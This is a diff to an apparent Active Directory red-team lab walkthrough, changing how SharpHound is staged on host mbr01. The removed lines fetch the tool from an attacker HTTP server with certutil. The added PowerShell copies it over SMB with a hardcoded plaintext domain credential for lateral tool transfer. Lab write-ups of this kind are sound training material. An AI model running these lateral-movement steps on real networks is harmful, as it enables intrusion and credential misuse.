@@ -24,12 +24,13 @@ Session data reveals attack paths invisible from LDAP alone (e.g., a user who's 
 
 #### Step 1 — Transfer SharpHound to mbr01
 
-```bash
-# From Kali: serve SharpHound on HTTP :8080
-python3 -m http.server 8080 --directory /opt/SharpHound/
-
-# From analyst_cloud context on mbr01:
-certutil -urlcache -split -f http://192.168.77.60:8080/SharpHound.exe SharpHound.exe
+```powershell
+# From ws01 (initial beachhead), copy SharpHound to mbr01 via SMB (T1570).
+# This mirrors the CRTP method: xcopy / Copy-Item C:\AD\Tools\<tool> \\target\C$\... then winrs.
+$pass = ConvertTo-SecureString 'T13r_An@lyst!' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential('child.cadre.local\analyst_t1', $pass)
+New-Item -ItemType Directory -Path '\\mbr01.child.cadre.local\C$\Tools' -Force -Credential $cred | Out-Null
+Copy-Item -Path 'C:\Tools\ADTools\SharpHound.exe' -Destination '\\mbr01.child.cadre.local\C$\Tools\SharpHound.exe' -Force -Credential $cred
 ```
 
 #### Step 2 — Run SharpHound as analyst_cloud
